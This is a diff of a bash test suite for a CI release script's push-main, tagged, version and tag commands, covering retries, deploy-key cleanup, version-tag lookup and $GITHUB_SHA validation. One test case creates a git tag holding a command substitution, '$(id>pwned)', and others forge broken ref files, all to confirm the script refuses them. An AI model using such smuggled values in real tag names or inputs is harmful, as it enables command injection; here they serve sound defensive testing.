-# The GitHub URL rewritten to a path that does not exist.
-push_main "$work/c5/b" 1.0.1 "$work/c5/summary.md" GIT_CONFIG_KEY_0="url.$work/c5/nowhere.git.insteadOf"
-check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "error names the fetch" "$(contains "$out" '^::error::Fetching main from origin failed on attempt 1\.')"
-check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
-check "job summary says the same" "$(contains "$(cat "$work/c5/summary.md" 2>/dev/null)" 'The release itself succeeded.*only this version-bump push to main is outstanding')"
-check "clone is not left mid-rebase" "$(not_rebasing "$work/c5/b")"
-
-echo
-echo "Case 6: the manifest deleted on main is a real divergence, not resolved"
-setup "$work/c6"
-git -C "$work/c6/a" rm -q -r packages/pkg
-git -C "$work/c6/a" commit -q -m "a: remove pkg"
-git -C "$work/c6/a" push -q origin main
-bump "$work/c6/b" 1.0.1
-push_main "$work/c6/b" 1.0.1
-check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "error names the manifest as the conflict" "$(contains "$out" '^::error::.*conflicts in: packages/pkg/package\.json\.')"
-check "rebase was aborted" "$(not_rebasing "$work/c6/b")"
-check "clone's manifest is intact, not truncated" "$(is "$(jq -r .version "$work/c6/b/packages/pkg/package.json")" 1.0.1)"
-check "origin/main is untouched" "$(is "$(origin_tip_subject "$work/c6")" "a: remove pkg")"
-
-echo
-echo "Case 7: a re-run whose first attempt already landed its bump pushes nothing"
-setup "$work/c7"
-bump "$work/c7/a" 1.0.1
-git -C "$work/c7/a" push -q origin main
-# The re-run recommits the same bump at a later time, so it is a commit of its own.
-GIT_AUTHOR_DATE="2001-01-01T00:00:00Z" GIT_COMMITTER_DATE="2001-01-01T00:00:00Z" bump "$work/c7/b" 1.0.1
-check "the re-run's bump is a different commit from main's" "$([ "$(git -C "$work/c7/b" rev-parse HEAD)" != "$(git -C "$work/c7/origin.git" rev-parse main)" ] && echo true || echo false)"
-push_main "$work/c7/b" 1.0.1 "$work/c7/summary.md"
-check "push-main exits 0" "$(is "$rc" 0)"
-check "notice says main already holds the version" "$(contains "$out" "^::notice title=Version bump not pushed::main's packages/pkg/package.json and bun\.lock already hold v1\.0\.1")"
-check "origin/main holds the version" "$(is "$(origin_version "$work/c7")" 1.0.1)"
-check "origin/main has one bump commit, not two" "$(is "$(release_commits "$work/c7")" 1)"
-check "clone is not left mid-rebase" "$(not_rebasing "$work/c7/b")"
-
-echo
-echo "Case 8: a re-run after a later release of the package landed never lowers main's version"
-setup "$work/c8"
-bump "$work/c8/a" 1.0.2
-git -C "$work/c8/a" push -q origin main
-bump "$work/c8/b" 1.0.1
-push_main "$work/c8/b" 1.0.1 "$work/c8/summary.md"
-check "push-main exits 0" "$(is "$rc" 0)"
-check "notice names the later release" "$(contains "$out" "^::notice title=Version bump not pushed::main's packages/pkg/package.json holds v1\.0\.2, a later release than v1\.0\.1")"
-check "job summary says the bump was not pushed" "$(contains "$(cat "$work/c8/summary.md" 2>/dev/null)" 'Version bump for packages/pkg v1.0.1 not pushed')"
-check "origin/main keeps the later version" "$(is "$(origin_version "$work/c8")" 1.0.2)"
-check "origin/main has only the later release's bump commit" "$(is "$(release_commits "$work/c8")" 1)"
-check "clone is not left mid-rebase" "$(not_rebasing "$work/c8/b")"
-
-echo
-echo "Case 8b: push-main pushes through the deploy key and leaves none behind"
-setup "$work/c8b"
-record_hook "$work/c8b/origin.git"
-bump "$work/c8b/b" 1.0.1
-push_main "$work/c8b/b" 1.0.1
-check "pushes: exits 0" "$(is "$rc" 0)"
-check "pushes: origin/main holds the bump" "$(is "$(origin_version "$work/c8b")" 1.0.1)"
-check "pushes: the key and the pinned host keys were owner-only while the push ran" \
-  "$(is "$seen" "600 key"$'\n'"600 known_hosts")"
-check "pushes: nothing is left in TMPDIR" "$(is "$left" 0)"
-setup "$work/c8c"
-record_hook "$work/c8c/origin.git"
-bump "$work/c8c/b" 1.0.1
-push_main "$work/c8c/b" 1.0.1 "" PUSH_REJECT=1
-check "five rejections: exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "five rejections: says the push race was lost 5 times" "$(contains "$out" '^::error::.*lost the push race to main 5 times\.')"
-check "five rejections: the key and the pinned host keys were owner-only while the pushes ran" \
-  "$(is "$seen" "600 key"$'\n'"600 known_hosts")"
-check "five rejections: nothing is left in TMPDIR" "$(is "$left" 0)"
-check "five rejections: origin/main manifest is untouched" "$(is "$(origin_version "$work/c8c")" 1.0.0)"
-setup "$work/c8d"
-bump "$work/c8d/b" 1.0.1
-push_main "$work/c8d/b" 1.0.1 "$work/c8d/summary.md" DEPLOY_KEY=
-check "no DEPLOY_KEY: exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "no DEPLOY_KEY: the error names it and says the release itself succeeded" \
-  "$(is "$(contains "$out" '^::error::.*DEPLOY_KEY')|$(contains "$out" 'The release itself succeeded')" 'true|true')"
-check "no DEPLOY_KEY: the job summary says the same" \
-  "$(contains "$(cat "$work/c8d/summary.md" 2>/dev/null)" 'DEPLOY_KEY.*The release itself succeeded')"
-check "no DEPLOY_KEY: origin/main is untouched" "$(is "$(origin_version "$work/c8d")" 1.0.0)"
-check "no DEPLOY_KEY: nothing is made in TMPDIR" "$(is "$left" 0)"
-push_main "$work/c8d/b" 1.0.1 "$work/c8d/summary.md" GITHUB_REPOSITORY=
-check "no GITHUB_REPOSITORY: exits non-zero, naming it, and says the release itself succeeded" \
-  "$([ "$rc" != 0 ] && is "$(contains "$out" '^::error::GITHUB_REPOSITORY.*The release itself succeeded')|$left" 'true|0' || echo false)"
-# HEAD:refs/heads/main serves a detached HEAD and a branch alike (a release job
-# may check out either); the pre-push checks (cases 2 to 2f) are what keep
-# everything but the exact bump off main.
-setup "$work/c8e"
-git -C "$work/c8e/b" checkout -q --detach
-bump "$work/c8e/b" 1.0.1
-push_main "$work/c8e/b" 1.0.1
-check "a detached HEAD: exits 0" "$(is "$rc" 0)"
-check "a detached HEAD: origin/main holds the bump" "$(is "$(origin_version "$work/c8e")" 1.0.1)"
-check "a detached HEAD: origin/main's tip is the bump commit" \
-  "$(is "$(git -C "$work/c8e/origin.git" rev-parse main)" "$(git -C "$work/c8e/b" rev-parse HEAD)")"
-# The manifest already held the version, so `tag` committed nothing and HEAD is main's tip.
-setup "$work/c8f"
-record_hook "$work/c8f/origin.git"
-push_main "$work/c8f/b" 1.0.0
-check "HEAD already on main: exits 0" "$(is "$rc" 0)"
-check "HEAD already on main: says there is nothing to push" "$(contains "$out" '^Nothing to push: main already holds this checkout$')"
-check "HEAD already on main: nothing was pushed" "$(is "$seen" "")"
-check "HEAD already on main: origin/main is unchanged" \
-  "$(is "$(git -C "$work/c8f/origin.git" rev-parse main)" "$(git -C "$work/c8f/b" rev-parse HEAD)")"
-
-echo
 echo "Case 9: tagged finds the tag an earlier attempt pushed for this checkout, and only that"
 setup "$work/c9"
 clone="$work/c9/a"
 seed=$(git -C "$clone" rev-parse HEAD)
-tagged "$clone" pkg-v packages/pkg
+tagged "$clone" pkg-v
 check "no tag: exits 0" "$(is "$rc" 0)"
 check "no tag: prints nothing" "$(is "$out" "")"
-# What one release run leaves: its bump commit, a child of the checkout, tagged.
-bump "$clone" 1.0.1
+# What one release run leaves: its tag on the commit it released, which is the commit the run
+# checked out, since `tag` tags $GITHUB_SHA and commits nothing.
 git -C "$clone" tag pkg-v1.0.1
-# Another package's release from the same checkout: a sibling bump, tagged with its own prefix.
-git -C "$clone" checkout -q --detach "$seed"
-mkdir -p "$clone/packages/other"
-printf '{\n  "name": "other",\n  "version": "2.0.1"\n}\n' > "$clone/packages/other/package.json"
-git -C "$clone" add -A
-git -C "$clone" commit -q -m "chore: release other v2.0.1 [skip ci]"
-git -C "$clone" tag other-v2.0.1
-git -C "$clone" checkout -q --detach "$seed"
-tagged "$clone" pkg-v packages/pkg
-check "the tag on HEAD's bump commit: printed" "$(is "$out" pkg-v1.0.1)"
 tagged "$clone" pkg-v
-check "without a package dir, a tag on HEAD's bump commit is not this checkout's" "$(is "$rc $out" "0 ")"
-tagged "$clone" other-v packages/other
+check "the tag on HEAD: printed" "$(is "$rc $out" "0 pkg-v1.0.1")"
+# Another package's release from the same commit: its own prefix's tag, on that same commit.
+git -C "$clone" tag other-v2.0.1
+tagged "$clone" other-v
 check "each prefix finds its own package's tag" "$(is "$out" other-v2.0.1)"
-# A later release: main moves past the first bump, and the next run tags its own bump.
-git -C "$clone" checkout -q --detach pkg-v1.0.1
-printf 'later\n' > "$clone/README.md"
-git -C "$clone" commit -q -am "fix: later change"
-later=$(git -C "$clone" rev-parse HEAD)
-bump "$clone" 1.0.2
+tagged "$clone" pkg-v
+check "another package's tag on the same commit changes nothing" "$(is "$out" pkg-v1.0.1)"
+# Two releases of one package on one commit: the newer version is this checkout's.
 git -C "$clone" tag pkg-v1.0.2
+tagged "$clone" pkg-v
+check "two tags of the prefix on HEAD: the newer version" "$(is "$out" pkg-v1.0.2)"
+git -C "$clone" tag -d pkg-v1.0.2 >/dev/null
+# A later release: the next run tags its own commit, which is no tag of this one.
+change "$clone" packages/pkg/index.js "fix: later change"
+later=$(git -C "$clone" rev-parse HEAD)
+git -C "$clone" tag pkg-v1.1.0
 git -C "$clone" checkout -q --detach "$seed"
-tagged "$clone" pkg-v packages/pkg
+tagged "$clone" pkg-v
 check "a later release on a descendant is not this checkout's" "$(is "$out" pkg-v1.0.1)"
 git -C "$clone" checkout -q --detach "$later"
-tagged "$clone" pkg-v packages/pkg
-check "the later run's checkout finds its own tag" "$(is "$out" pkg-v1.0.2)"
-# A tag on a child of HEAD that changes more than the manifest is not a bump commit.
+tagged "$clone" pkg-v
+check "the later run's checkout finds its own tag" "$(is "$out" pkg-v1.1.0)"
+# No release commits anything any more, so a tagged child of HEAD is another commit's release,
+# whatever it changes: the manifest and the lockfile alone, the shape the bump commit had, counts
+# no more than any other child.
 git -C "$clone" checkout -q --detach "$seed"
-printf 'not a bump\n' > "$clone/README.md"
-jq '.version = "1.0.9"' "$clone/packages/pkg/package.json" > "$clone/tmp.json" \
+jq '.version = "1.0.3"' "$clone/packages/pkg/package.json" > "$clone/tmp.json" \
   && mv "$clone/tmp.json" "$clone/packages/pkg/package.json"
-git -C "$clone" commit -q -am "feat: a child that is not a bump"
-git -C "$clone" tag pkg-v1.0.9
+sed -i '/^    "packages\/pkg": {$/,/^    },$/ s/^      "version": "[^"]*",$/      "version": "1.0.3",/' "$clone/bun.lock"
+git -C "$clone" commit -q -am "chore: release pkg v1.0.3 [skip ci]"
+git -C "$clone" tag pkg-v1.0.3
 git -C "$clone" checkout -q --detach "$seed"
-tagged "$clone" pkg-v packages/pkg
-check "a tagged child changing another file is skipped" "$(is "$out" pkg-v1.0.1)"
-# The manifest already held the version, so `tag` tagged HEAD itself.
-git -C "$work/c9/b" tag pkg-v1.0.0
-tagged "$work/c9/b" pkg-v packages/pkg
-check "a tag on HEAD itself: printed" "$(is "$out" pkg-v1.0.0)"
-# A job that tags the commit it checked out (legion, the Envoy listener) passes no package dir.
-tagged "$work/c9/b" pkg-v
-check "without a package dir, a tag on HEAD itself: printed" "$(is "$out" pkg-v1.0.0)"
-# A bump commit of the manifest alone, the shape `tag` made before the lockfile
-# took the version, and one of the lockfile alone, which `tag` makes when the
-# manifest already held the version: each is a bump commit.
-setup "$work/c9b"
-clone="$work/c9b/a"
-seed=$(git -C "$clone" rev-parse HEAD)
-set_version "$clone" 1.0.1
-git -C "$clone" commit -q -am "chore: release pkg v1.0.1 [skip ci]"
-git -C "$clone" tag pkg-v1.0.1
-git -C "$clone" checkout -q --detach "$seed"
-tagged "$clone" pkg-v packages/pkg
-check "a tagged child changing the manifest alone: printed" "$(is "$rc $out" "0 pkg-v1.0.1")"
-set_lock_version "$clone" 2.0.1 packages/other
-git -C "$clone" commit -q -am "chore: release other v2.0.1 [skip ci]"
-git -C "$clone" tag other-v2.0.1
-git -C "$clone" checkout -q --detach "$seed"
-tagged "$clone" other-v packages/other
-check "a tagged child changing the lockfile alone: printed" "$(is "$rc $out" "0 other-v2.0.1")"
-printf 'not a bump\n' > "$clone/README.md"
-set_lock_version "$clone" 1.0.9
-git -C "$clone" commit -q -am "feat: a child that is not a bump"
-git -C "$clone" tag pkg-v1.0.9
-git -C "$clone" checkout -q --detach "$seed"
-tagged "$clone" pkg-v packages/pkg
-check "a tagged child changing the lockfile and another file is skipped" "$(is "$out" pkg-v1.0.1)"
+tagged "$clone" pkg-v
+check "a tag on a child of HEAD that changes the manifest and the lockfile alone is skipped" "$(is "$out" pkg-v1.0.1)"
 
 echo
 echo "Case 10: tagged refuses a release tag whose name is not <prefix>X.Y.Z"
 setup "$work/c10"
 clone="$work/c10/a"
 seed=$(git -C "$clone" rev-parse HEAD)
-bump "$clone" 1.0.1
 # shellcheck disable=SC2016 # literal $(…): git accepts it in a tag name
 git -C "$clone" tag 'pkg-v1.0.1$(id>pwned)'
-git -C "$clone" checkout -q --detach "$seed"
-tagged "$clone" pkg-v packages/pkg
-check "a command substitution on the bump commit: exits 1" "$(is "$rc" 1)"
-check "a command substitution on the bump commit: prints no tag" "$(is "$out" "")"
-check "a command substitution on the bump commit: the error names the tag" "$(contains "$err" '^::error::release-push.sh tagged: pkg-v1\.0\.1.*id.*pwned.*, the release tag for this checkout, is not pkg-vX\.Y\.Z; refusing it$')"
-check "a command substitution on the bump commit: nothing in it ran" "$([ ! -e "$clone/pwned" ] && echo true || echo false)"
+tagged "$clone" pkg-v
+check "a command substitution on HEAD: exits 1" "$(is "$rc" 1)"
+check "a command substitution on HEAD: prints no tag" "$(is "$out" "")"
+check "a command substitution on HEAD: the error names the tag" "$(contains "$err" '^::error::release-push.sh tagged: pkg-v1\.0\.1.*id.*pwned.*, the release tag for this checkout, is not pkg-vX\.Y\.Z; refusing it$')"
+check "a command substitution on HEAD: nothing in it ran" "$([ ! -e "$clone/pwned" ] && echo true || echo false)"
 # shellcheck disable=SC2016 # literal $(…), the tag's name
 git -C "$clone" tag -d 'pkg-v1.0.1$(id>pwned)' >/dev/null
 git -C "$clone" tag pkg-v1.0.0-rc.1
-tagged "$clone" pkg-v packages/pkg
+tagged "$clone" pkg-v
 check "a pre-release on HEAD: exits 1" "$(is "$rc" 1)"
 check "a pre-release on HEAD: prints no tag" "$(is "$out" "")"
 check "a pre-release on HEAD: the error names the tag" "$(contains "$err" '^::error::release-push.sh tagged: pkg-v1\.0\.0-rc\.1, the release tag for this checkout, is not pkg-vX\.Y\.Z; refusing it$')"
@@ -850,14 +324,14 @@ git -C "$clone" tag -d pkg-v1.0.0-rc.1 >/dev/null
 for name in pkg-v1.010.0 pkg-v01.0.0; do
   git -C "$clone" tag "$name"
   tagged "$clone" pkg-v
-  check "a leading zero on HEAD ($name), no package dir: exits 1" "$(is "$rc" 1)"
-  check "a leading zero on HEAD ($name), no package dir: prints no tag" "$(is "$out" "")"
-  check "a leading zero on HEAD ($name), no package dir: the error names the tag" "$(contains "$err" "^::error::release-push.sh tagged: ${name//./\\.}, the release tag for this checkout, is not pkg-vX\.Y\.Z; refusing it$")"
+  check "a leading zero on HEAD ($name): exits 1" "$(is "$rc" 1)"
+  check "a leading zero on HEAD ($name): prints no tag" "$(is "$out" "")"
+  check "a leading zero on HEAD ($name): the error names the tag" "$(contains "$err" "^::error::release-push.sh tagged: ${name//./\\.}, the release tag for this checkout, is not pkg-vX\.Y\.Z; refusing it$")"
   git -C "$clone" tag -d "$name" >/dev/null
 done
 git -C "$clone" tag pkg-v1.0.0
 tagged "$clone" pkg-v
-check "a zero field is plain: pkg-v1.0.0 on HEAD, no package dir, printed" "$(is "$rc $out" "0 pkg-v1.0.0")"
+check "a zero field is plain: pkg-v1.0.0 on HEAD, printed" "$(is "$rc $out" "0 pkg-v1.0.0")"
 git -C "$clone" tag -d pkg-v1.0.0 >/dev/null
 # Git refuses a tag name holding a space or a newline, and ignores a ref file
 # forged with one, so `tagged` is never handed either.
@@ -866,7 +340,7 @@ for name in 'pkg-v1.0.2 x' $'pkg-v1.0.2\nx'; do
   check "git refuses to create the tag $shown" "$(git -C "$clone" tag "$name" 2>/dev/null && echo false || echo true)"
   printf '%s\n' "$seed" > "$clone/.git/refs/tags/$name"
 done
-tagged "$clone" pkg-v packages/pkg
+tagged "$clone" pkg-v
 check "forged refs with a space and a newline: exits 0" "$(is "$rc" 0)"
 check "forged refs with a space and a newline: prints no tag" "$(is "$out" "")"
 check "forged refs with a space and a newline: git ignores both" "$(is "$(printf '%s\n' "$err" | { grep -c '^warning: ignoring ref with broken name refs/tags/pkg-v1\.0\.2' || true; })" 2)"
@@ -912,14 +386,26 @@ version_run "$clone" pkg-v -- packages/pkg/
 check "a tag on HEAD: exits 0" "$(is "$rc" 0)"
 check "a tag on HEAD: prints its version, the tag and skip=false, nothing else" "$(is "$out" "$(outputs 1.0.0 pkg-v1.0.0 false)")"
 check "a tag on HEAD: says it was already pushed" "$(contains "$err" '^Releasing pkg-v1\.0\.0, already pushed for this checkout$')"
-# What one release run leaves (case 9): its bump commit, a child of the checkout, tagged.
-bump "$work/v/b" 1.0.1
-git -C "$work/v/b" tag pkg-v1.0.1
-git -C "$work/v/b" checkout -q --detach "$seed"
-version_run "$work/v/b" pkg-v --package-dir packages/pkg -- packages/pkg/
-check "a tag on HEAD's bump commit, with the package dir: that tag's version" "$(is "$rc $out" "0 $(outputs 1.0.1 pkg-v1.0.1 false)")"
-version_run "$work/v/b" pkg-v -- packages/pkg/
-check "the same without the package dir: the newest tag is on a descendant, so nothing is since it" "$(is "$rc $out" "0 $(outputs '' '' true)")"
+# What `tag` leaves a re-run: the release tag on the commit the run released, made by the script
+# under test with $GITHUB_SHA naming that commit.
+vb="$work/v/b"
+vb_sha=$(git -C "$vb" rev-parse HEAD)
+set +e
+(cd "$vb" && GITHUB_SHA="$vb_sha" "$release_push" tag 1.0.1 pkg-v1.0.1) >/dev/null 2>&1
+rc=$?
+set -e
+check "tag on this checkout: exits 0" "$(is "$rc" 0)"
+check "tag on this checkout: committed nothing, leaving the work tree as it was" \
+  "$(is "$(git -C "$vb" rev-parse HEAD)|$(git -C "$vb" status --porcelain)" "$vb_sha|")"
+version_run "$vb" pkg-v -- packages/pkg/
+check "the tag tag made on HEAD: its version, the tag and skip=false" "$(is "$rc $out" "0 $(outputs 1.0.1 pkg-v1.0.1 false)")"
+check "the tag tag made on HEAD: says it was already pushed" "$(contains "$err" '^Releasing pkg-v1\.0\.1, already pushed for this checkout$')"
+# A commit after that release: the next version comes from the tag alone, since no commit of the
+# release itself sits on the branch to read a version from.
+change "$vb" packages/pkg/index.js "fix: a bug after the release"
+version_run "$vb" pkg-v -- packages/pkg/
+check "a commit after the tag: the next version from the tag alone" "$(is "$rc $out" "0 $(outputs 1.0.2 pkg-v1.0.2 false)")"
+check "a commit after the tag: logs the bump from that tag" "$(contains "$err" '^Bumping pkg-v1\.0\.1 -> pkg-v1\.0\.2$')"
 # Commits since the tag, each kind from the tagged commit.
 change "$clone" packages/pkg/index.js "feat: add an export"
 feat=$(git -C "$clone" rev-parse HEAD)
@@ -1058,96 +544,112 @@ version_run "$clone" pkg-v --bogus -- packages/pkg/
 check "an unknown option: exits 2 printing nothing, with the usage" "$(is "$rc|$out|$(contains "$err" '^::error::release-push.sh version: unknown option --bogus; usage: release-push.sh version ')" "2||true")"
 
 echo
-echo "Case 10c: tag commits the bump and tags it locally, pushing nothing"
-# tag_run <clone> <version> <tag> [<package-dir> <name>]: sets the manifest's
-# version as the workflow does before `tag`, then runs `release-push.sh tag`
-# from <clone>; <package-dir> and <name> default to packages/pkg and pkg.
-# Leaves its exit code in rc and its combined output in out.
+echo "Case 10c: tag makes the release tag on \$GITHUB_SHA, committing nothing and pushing nothing"
+# tag_run <clone> <version> <tag> [<sha>]: runs `release-push.sh tag <version> <tag>` from <clone>
+# with $GITHUB_SHA naming <clone>'s HEAD, as the publish job runs it from the run's commit, or
+# naming <sha> when one is given (the empty string for a $GITHUB_SHA set to nothing). Leaves its
+# exit code in rc and its combined output in out.
 tag_run() {
-  local clone=$1 v=$2 tag=$3 package_dir=${4:-packages/pkg} name=${5:-pkg}
-  set_version "$clone" "$v" "$package_dir"
+  local clone=$1 v=$2 tag=$3 sha=${4-}
+  [ $# -ge 4 ] || sha=$(git -C "$clone" rev-parse HEAD)
   set +e
-  out=$(cd "$clone" && "$release_push" tag "$package_dir" "chore: release $name v$v [skip ci]" "$tag" 2>&1)
+  out=$(cd "$clone" && env GITHUB_SHA="$sha" "$release_push" tag "$v" "$tag" 2>&1)
   rc=$?
   set -e
 }
+# state <clone>: what `tag` leaves as it was — HEAD, how many commits the branch holds, the blob
+# of every file under packages/ and of bun.lock, and whatever the work tree and index carry.
+state() {
+  git -C "$1" rev-parse HEAD
+  git -C "$1" rev-list --count HEAD
+  git -C "$1" ls-tree -r HEAD -- packages bun.lock
+  git -C "$1" status --porcelain
+}
 setup "$work/t"
 clone="$work/t/a"
+mkdir -p "$clone/packages/other"
+printf '{\n  "name": "other",\n  "version": "2.0.0"\n}\n' > "$clone/packages/other/package.json"
+git -C "$clone" add -A
+git -C "$clone" commit -q -m "feat: add other"
+git -C "$clone" push -q origin main
+run=$(git -C "$clone" rev-parse HEAD)
+before=$(state "$clone")
 tag_run "$clone" 1.0.1 pkg-v1.0.1
 check "tags: exits 0" "$(is "$rc" 0)"
-check "tags: the clone has the bump commit" "$(is "$(git -C "$clone" log -1 --format=%s)" "chore: release pkg v1.0.1 [skip ci]")"
-check "tags: the tag is on it" "$(is "$(git -C "$clone" rev-parse 'pkg-v1.0.1^{commit}')" "$(git -C "$clone" rev-parse HEAD)")"
+check "tags: the tag names \$GITHUB_SHA" "$(is "$(git -C "$clone" rev-list -n 1 pkg-v1.0.1)" "$run")"
+check "tags: no commit is added and the manifests and the lockfile are untouched" "$(is "$(state "$clone")" "$before")"
 check "tags: origin has no tag" "$(is "$(git -C "$work/t/origin.git" tag -l)" "")"
-check "tags: origin/main is untouched" "$(is "$(origin_version "$work/t")" 1.0.0)"
-check "tags: the bump commit changes the manifest and the lockfile" \
-  "$(is "$(git -C "$clone" diff --name-only HEAD^ HEAD)" "bun.lock"$'\n'"packages/pkg/package.json")"
-check "tags: the lockfile's workspace entry takes the version" "$(is "$(lock_version "$clone" HEAD)" 1.0.1)"
-check "tags: the lockfile changes in that one line, the decoys untouched" \
-  "$(is "$(git -C "$clone" diff --numstat HEAD^ HEAD -- bun.lock)|$(lock_version "$clone" HEAD packages/pkg-ui)" "1	1	bun.lock|1.0.0")"
-check "tags: no temporary file is left in the checkout" "$(is "$(git -C "$clone" status --porcelain --ignored)" "")"
+check "tags: origin/main is untouched" "$(is "$(git -C "$work/t/origin.git" rev-parse main)" "$run")"
 tag_run "$clone" 1.0.1 pkg-v1.0.1
-check "the same version again: exits 0, reusing the tag" "$(is "$rc|$(contains "$out" '^Tag pkg-v1\.0\.1 already exists for version 1\.0\.1; reusing it$')" '0|true')"
-check "the same version again: still nothing on origin" "$(is "$(git -C "$work/t/origin.git" tag -l)" "")"
-tag_run "$clone" 1.0.2 pkg-v1.0.1
-check "another version under the existing tag: exits 1 naming both versions" \
-  "$(is "$rc|$(contains "$out" '^::error::tag pkg-v1\.0\.1 already exists with version 1\.0\.1, not 1\.0\.2$')" '1|true')"
-# The lockfile without an entry for the package: nothing is committed or tagged.
+check "the tag already on this commit: exits 0, reusing it" \
+  "$(is "$rc|$(contains "$out" '^Tag pkg-v1\.0\.1 already exists for version 1\.0\.1; reusing it$')" '0|true')"
+check "the tag already on this commit: still no commit, and still nothing on origin" \
+  "$(is "$(state "$clone")|$(git -C "$work/t/origin.git" tag -l)" "$before|")"
+# The tag on another commit: the run releases a commit the tag does not name.
+change "$clone" packages/pkg/index.js "fix: a later commit"
+later=$(git -C "$clone" rev-parse HEAD)
+before=$(state "$clone")
+tag_run "$clone" 1.0.1 pkg-v1.0.1
+check "the tag on another commit: exits 1" "$(is "$rc" 1)"
+check "the tag on another commit: the error names both commits" \
+  "$(contains "$out" "^::error::tag pkg-v1\.0\.1 already exists on $run, not $later, the commit this run releases$")"
+check "the tag on another commit: the tag still names the commit it named" \
+  "$(is "$(git -C "$clone" rev-list -n 1 pkg-v1.0.1)" "$run")"
+check "the tag on another commit: nothing else is tagged and nothing is committed" \
+  "$(is "$(git -C "$clone" tag -l)|$(state "$clone")" "pkg-v1.0.1|$before")"
+# A version that is not X.Y.Z, each refused before anything is tagged.
+for v in 1.0 1.0.1-rc.1 01.0.0; do
+  tag_run "$clone" "$v" "pkg-v$v"
+  check "a version that is not X.Y.Z ($v): exits 1" "$(is "$rc" 1)"
+  check "a version that is not X.Y.Z ($v): the error names it" \
+    "$(contains "$out" "^::error::release-push.sh tag: the release version ${v//./\\.} is not X\.Y\.Z")"
+  check "a version that is not X.Y.Z ($v): nothing is tagged" "$(is "$(git -C "$clone" tag -l)" pkg-v1.0.1)"
+done
+# A $GITHUB_SHA that is not a commit sha: empty, not hex, short, or upper-case hex.
+for bad in '' not-a-sha "${run:0:12}" "${run^^}"; do
+  printf -v shown '%q' "$bad"
+  tag_run "$clone" 1.0.2 pkg-v1.0.2 "$bad"
+  check "a \$GITHUB_SHA that is not 40 lower-case hex ($shown): exits 1" "$(is "$rc" 1)"
+  check "a \$GITHUB_SHA that is not 40 lower-case hex ($shown): the error names it" \
+    "$(contains "$out" '^::error::release-push.sh tag: GITHUB_SHA names the commit this run releases; ')"
+  check "a \$GITHUB_SHA that is not 40 lower-case hex ($shown): nothing is tagged" "$(is "$(git -C "$clone" tag -l)" pkg-v1.0.1)"
+done
+set +e
+out=$(cd "$clone" && env -u GITHUB_SHA "$release_push" tag 1.0.2 pkg-v1.0.2 2>&1)
+rc=$?
+set -e
+check "an unset \$GITHUB_SHA: exits 1 naming it, with nothing tagged" \
+  "$(is "$rc|$(contains "$out" '^::error::release-push.sh tag: GITHUB_SHA names the commit this run releases; ')|$(git -C "$clone" tag -l)" '1|true|pkg-v1.0.1')"
+# The tags are fetched, so a tag another attempt pushed since the checkout is seen: one on this
+# run's commit is reused, one on another commit is refused.
 setup "$work/t2"
-clone="$work/t2/a"
-sed -i 's|^    "packages/pkg": {$|    "packages/pkg-renamed": {|' "$clone/bun.lock"
-git -C "$clone" commit -q -am "chore: rename the entry"
-tag_run "$clone" 1.0.1 pkg-v1.0.1
-check "no entry in the lockfile: exits 1 naming the lockfile and the entry" \
-  "$(is "$rc|$(contains "$out" '^::error::release-push.sh tag: bun\.lock holds no workspace entry "packages/pkg" with one "version" line, so the bump cannot set it to 1\.0\.1$')" '1|true')"
-check "no entry in the lockfile: nothing is committed, tagged or left behind" \
-  "$(is "$(git -C "$clone" log -1 --format=%s)|$(git -C "$clone" tag -l)|$(git -C "$clone" status --porcelain)" "chore: rename the entry|| M packages/pkg/package.json")"
-# A lockfile whose last line has no newline keeps it so: the bump changes the one
-# line, push-main lands it, and a bump that also adds the newline is refused.
-setup "$work/t3"
-clone="$work/t3/a"
-printf '%s' "$(<"$clone/bun.lock")" > "$clone/bun.lock"
-git -C "$clone" commit -q -am "chore: a lockfile without a final newline"
-git -C "$clone" push -q origin main
-tag_run "$clone" 1.0.1 pkg-v1.0.1
-check "no final newline: tag exits 0" "$(is "$rc" 0)"
-check "no final newline: the bump changes one line of the lockfile, which still ends without a newline" \
-  "$(is "$(git -C "$clone" diff --numstat HEAD^ HEAD -- bun.lock)|$(git -C "$clone" show HEAD:bun.lock | tail -c 1)" "1	1	bun.lock|}")"
-deploy_run "$clone" GITHUB_STEP_SUMMARY= -- push-main packages/pkg 1.0.1
-check "no final newline: push-main lands the bump" "$(is "$rc|$(lock_version "$work/t3/origin.git" main)" "0|1.0.1")"
-clone="$work/t3/b"
-git -C "$clone" pull -q origin main
-set_version "$clone" 1.0.2
-set_lock_version "$clone" 1.0.2
-printf '\n' >> "$clone/bun.lock"
-git -C "$clone" commit -q -am "chore: release pkg v1.0.2 [skip ci]"
-deploy_run "$clone" GITHUB_STEP_SUMMARY= -- push-main packages/pkg 1.0.2
-check "no final newline: push-main refuses a bump that adds one" \
-  "$(is "$rc|$(contains "$out" "^::error::HEAD's bun\.lock differs from its parent's in more than the version line")" "1|true")"
-# A backslash in the package dir is taken literally: packages/pk\g is not packages/pkg.
-setup "$work/t4"
-clone="$work/t4/a"
-mkdir "$clone/packages/pk\\g"
-printf '{\n  "name": "pkg-backslash",\n  "version": "1.0.0"\n}\n' > "$clone/packages/pk\\g/package.json"
-git -C "$clone" add -A
-git -C "$clone" commit -q -m "feat: a package dir with a backslash"
-tag_run "$clone" 1.0.1 pkg-v1.0.1 'packages/pk\g' pkg-backslash
-check "a backslash in the package dir: tag refuses, finding no entry of that name" \
-  "$(is "$rc|$(contains "$out" 'bun\.lock holds no workspace entry "packages/pk\\g"')" "1|true")"
-check "a backslash in the package dir: packages/pkg's entry is untouched" "$(is "$(lock_version "$clone" HEAD)|$(git -C "$clone" diff --quiet -- bun.lock && echo clean)" "1.0.0|clean")"
+run=$(git -C "$work/t2/a" rev-parse HEAD)
+git -C "$work/t2/b" tag pkg-v1.2.0
+git -C "$work/t2/b" push -q origin pkg-v1.2.0
+before=$(state "$work/t2/a")
+tag_run "$work/t2/a" 1.2.0 pkg-v1.2.0
+check "a tag another attempt pushed for this commit: fetched and reused" \
+  "$(is "$rc|$(contains "$out" '^Tag pkg-v1\.2\.0 already exists for version 1\.2\.0; reusing it$')|$(state "$work/t2/a")" "0|true|$before")"
+change "$work/t2/b" README.md "fix: another commit"
+other=$(git -C "$work/t2/b" rev-parse HEAD)
+git -C "$work/t2/b" tag pkg-v1.3.0
+git -C "$work/t2/b" push -q origin pkg-v1.3.0
